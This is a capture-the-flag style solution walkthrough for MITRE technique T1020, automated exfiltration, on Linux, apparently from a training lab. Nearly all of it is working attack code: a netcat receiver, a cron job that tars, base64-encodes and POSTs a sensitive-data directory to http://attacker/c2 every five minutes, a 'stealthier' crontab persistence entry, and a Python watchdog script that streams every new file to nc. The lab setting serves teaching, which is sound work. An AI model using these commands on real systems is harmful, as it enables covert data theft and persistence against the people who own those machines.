# T1020 – Automated Exfiltration | Solution Walkthrough
**Difficulty:** Intermediate | **OS:** Linux | **MITRE:** T1020

## Step 1 – Start C2 Receiver
```bash
nc -lvnp 5555
```

## Step 2 – Start File Watcher (New Terminal)
```bash
bash /opt/auto_exfil.sh &
# [*] Watching /opt/watch-dir for new files...
```

## Step 3 – Trigger Automated Exfil
```bash
cp /opt/sensitive-data/flag.txt /opt/watch-dir/
# Auto exfil fires immediately!
# C2 receives: HACKTIFY{AUTOMATED_EXFIL_<hash>}
```

## Step 4 – Advanced: cron-based Auto Exfil
```bash
# Exfil everything in /opt/sensitive-data every 5 min:
echo "*/5 * * * * tar czf - /opt/sensitive-data/ | base64 | curl -s -X POST http://attacker/c2 -d @-" | crontab -
# Even stealthier — only if data changed (use md5):
(crontab -l 2>/dev/null; echo "*/10 * * * * bash /opt/auto_exfil.sh") | crontab -
```

## Step 5 – Python Watchdog Alternative
```python
import watchdog.observers, watchdog.events, subprocess
class ExfilHandler(watchdog.events.FileSystemEventHandler):
    def on_created(self, event):
        if not event.is_directory:
            subprocess.run(f"cat {event.src_path} | nc localhost 5555", shell=True)
observer = watchdog.observers.Observer()
observer.schedule(ExfilHandler(), "/opt/watch-dir", recursive=True)
observer.start()
```
